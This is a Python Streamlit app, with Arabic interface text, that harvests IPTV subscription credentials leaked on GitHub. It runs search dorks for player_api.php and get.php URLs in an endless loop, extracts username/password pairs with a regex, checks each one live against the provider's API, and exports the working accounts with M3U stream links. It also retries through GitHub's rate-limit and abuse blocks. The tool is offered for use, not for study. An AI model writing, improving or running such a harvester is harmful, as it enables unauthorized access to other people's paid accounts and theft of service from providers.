import streamlit as st
import requests
import re
import time
import json
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime

# =================================================
# 1. إعدادات الأمان
# =================================================
LOGIN_PASSWORD = "BEAST_V17_PRO" 

def check_password():
    if "password_correct" not in st.session_state:
        st.session_state.password_correct = False
    if st.session_state.password_correct:
        return True

    st.markdown("<h2 style='text-align: center; color:#00ff41;'>🌪️ Ultra Beast V17 PRO</h2>", unsafe_allow_html=True)
    pwd = st.text_input("أدخل كلمة المرور الخاصة بالإصدار 17:", type="password")
    if st.button("دخول"):
        if pwd == LOGIN_PASSWORD:
            st.session_state.password_correct = True
            st.rerun()
        else:
            st.error("❌ خطأ في كلمة المرور!")
    return False

if not check_password():
    st.stop()

# =================================================
# 2. إعدادات الواجهة
# =================================================
st.set_page_config(page_title="Ultra Beast V17 PRO - INFINITE", layout="wide")

st.markdown("""
<style>
    .stApp { background-color: #0c0e12; }
    .card {
        background: #14161a;
        border: 1px solid #2d323b;
        border-right: 5px solid #00ff41;
        padding: 15px;
        border-radius: 8px;
        margin-bottom: 10px;
    }
    .host-text { color: #00ff41; font-weight: bold; font-family: monospace; }
    .country-tag { background: #333; color: #fff; padding: 2px 6px; border-radius: 4px; font-size: 10px; }
</style>
""", unsafe_allow_html=True)

# إدارة الحالة
if 'results' not in st.session_state: st.session_state.results = []
if 'is_hunting' not in st.session_state: st.session_state.is_hunting = False
if 'checked_count' not in st.session_state: st.session_state.checked_count = 0
if 'seen_urls' not in st.session_state: st.session_state.seen_urls = set()

# إنشاء جلسة اتصال سريعة
if 'req_session' not in st.session_state:
    st.session_state.req_session = requests.Session()
    st.session_state.req_session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    })

# =================================================
# 3. محرك الفحص والبيانات
# =================================================

def is_valid_syntax(host, user, pw):
    # فلتر سريع لمنع فحص السيرفرات الوهمية لتوفير الوقت
    bad_words = ['localhost', '127.0.0.1', 'your-ip', 'domain.com', 'server.com', 'example']
    bad_users = ['user', 'test', 'username', 'pass', 'password', 'x']
    if any(w in host.lower() for w in bad_words) or user.lower() in bad_users or pw.lower() in bad_users:
        return False
    return True

def get_country(host):
    try:
        ip = host.split('//')[-1].split(':')[0]
        res = st.session_state.req_session.get(f"http://ip-api.com/json/{ip}", timeout=2).json()
        return res.get('country', 'Unknown')
    except: return "Global"

def check_account(host, user, pw):
    if not is_valid_syntax(host, user, pw): return None
    
    unique_key = f"{host}|{user}"
    if unique_key in st.session_state.seen_urls: return None
    st.session_state.seen_urls.add(unique_key)

    try:
        api_url = f"{host}/player_api.php?username={user}&password={pw}"
        r = st.session_state.req_session.get(api_url, timeout=5).json()
        
        if r.get("user_info", {}).get("status") == "Active":
            info = r["user_info"]
            exp = datetime.fromtimestamp(int(info['exp_date'])).strftime('%Y-%m-%d') if info.get('exp_date') else "Unlimited"
            country = get_country(host)
            m3u_link = f"{host}/get.php?username={user}&password={pw}&type=m3u_plus&output=ts"
            
            return {
                "host": host, "user": user, "pass": pw, 
                "exp": exp, "conn": f"{info.get('active_cons')}/{info.get('max_connections')}",
                "country": country, "m3u": m3u_link
            }
    except: return None
    return None

# =================================================
# 4. واجهة التحكم والتحميل
# =================================================
with st.sidebar:
    st.title("🌪️ BEAST V17")
    token = st.text_input("GitHub Token:", type="password")
    
    if st.button("🚀 ابدأ الصيد المليوني"):
        if token: 
            st.session_state.is_hunting = True
            st.rerun()
        else: st.warning("ضع التوكن أولاً!")
    
    if st.button("🛑 توقف"):
        st.session_state.is_hunting = False
        st.rerun()

    st.divider()
    
    # واجهة الإحصائيات الحية
    stat_check = st.empty()
    stat_found = st.empty()
    stat_check.metric("🔍 تم فحص", st.session_state.checked_count)
    stat_found.metric("💎 صيد صالح", len(st.session_state.results))
    
    if st.session_state.results:
        st.subheader("📥 تحميل الصيد")
        export_data = ""
        for item in st.session_state.results:
            export_data += f"COUNTRY: {item['country']}\nHOST: {item['host']}\nUSER: {item['user']}\nPASS: {item['pass']}\nEXP: {item['exp']}\nM3U: {item['m3u']}\n" + "-"*30 + "\n"
        
        st.download_button(
            label="تحميل ملف النتائج .txt",
            data=export_data,
            file_name=f"Beast_Hunt_{datetime.now().strftime('%H-%M')}.txt",
            mime="text/plain"
        )

# =================================================
# 5. منطقة العرض المباشر
# =================================================
st.subheader("📡 الرادار المباشر اللانهائي (V17 PRO)")
status_log = st.empty()
results_area = st.empty()

def render_display():
    # تحديث العدادات الجانبية
    stat_check.metric("🔍 تم فحص", st.session_state.checked_count)
    stat_found.metric("💎 صيد صالح", len(st.session_state.results))
    
    # تحديث كروت النتائج
    html_content = ""
    for item in st.session_state.results:
        html_content += f"""
        <div class="card">
            <div style="display:flex; justify-content:space-between;">
                <span class="host-text">{item['host']}</span>
                <span class="country-tag">🌍 {item['country']}</span>
            </div>
            <div style="margin-top:10px; font-size:14px; color:#ccc;">
                <b>USER:</b> {item['user']} | <b>PASS:</b> {item['pass']} <br>
                <b>EXP:</b> <span style="color:#ffa500;">{item['exp']}</span> | <b>CONN:</b> {item['conn']}
            </div>
            <div style="background:#000; padding:5px; margin-top:5px; border-radius:4px; font-size:11px; color:#00ff41; overflow-x:auto;">
                M3U: {item['m3u']}
            </div>
        </div>
        """
    results_area.markdown(html_content, unsafe_allow_html=True)

# عرض النتائج القديمة إن وجدت
if not st.session_state.is_hunting:
    render_display()

# --- محرك البحث اللانهائي (The Infinite Harvester) ---
if st.session_state.is_hunting:
    headers = {'Authorization': f'token {token}', 'Accept': 'application/vnd.github.v3+json'}
    dorks = [
        '"player_api.php" user pass extension:txt',
        'extension:txt "get.php?username="', 
        'filename:iptv.txt "password="', 
        'extension:m3u "http" "password="',
        '"http://" "user" "pass" extension:m3u'
    ]
    
    # حلقة لا نهائية (لن يتوقف البرنامج إلا بضغطك على زر الإيقاف)
    while st.session_state.is_hunting:
        for dork in dorks:
            if not st.session_state.is_hunting: break
            
            for page in range(1, 15): # رفعنا عدد الصفحات لـ 15
                if not st.session_state.is_hunting: break
                
                status_log.info(f"🔎 جاري فحص الرادار المستمر: {dork} | صفحة {page}")
                
                try:
                    url = f"https://api.github.com/search/code?q={dork}&per_page=100&page={page}"
                    res = st.session_state.req_session.get(url, headers=headers).json()
                    
                    # نظام الحماية من حظر جيت هاب (لن يتوقف أبداً)
                    if "message" in res and ("rate limit" in res["message"].lower() or "abuse" in res["message"].lower()):
                        status_log.warning("⏳ الرادار يبرد محركاته (تخطي حظر جيت هاب)... سيستأنف الصيد بعد 30 ثانية.")
                        time.sleep(30)
                        continue # سيعيد المحاولة دون أن يغلق البرنامج
                    
                    items = res.get('items', [])
                    if not items: break # إذا فرغت الصفحة انتقل للدورك الذي يليه
                    
                    for item in items:
                        if not st.session_state.is_hunting: break
                        raw_url = item['html_url'].replace('github.com', 'raw.githubusercontent.com').replace('/blob/', '/')
                        
                        try:
                            content = st.session_state.req_session.get(raw_url, timeout=4).text
                            matches = re.findall(r"(https?://[\w\.-]+(?::\d+)?)/[a-zA-Z\._-]+\?username=([\w\.-]+)&password=([\w\.-]+)", content)
                            
                            for m in matches:
                                st.session_state.checked_count += 1
                                # فحص الحساب لايف للتأكد أنه يعمل
                                found = check_account(m[0], m[1], m[2])
                                if found:
                                    st.session_state.results.insert(0, found)
                                    render_display()
                        except: continue
                    
                    time.sleep(3) # راحة بسيطة بين الصفحات لعدم إغضاب السيرفرات
                except Exception as e:
                    time.sleep(5)
                    continue
                
        # استراحة بسيطة قبل إعادة دورة البحث من جديد
        status_log.success("🔄 تم مسح جميع الكلمات، جاري إعادة تدوير الرادار للبحث عن تسريبات جديدة...")
        time.sleep(10)
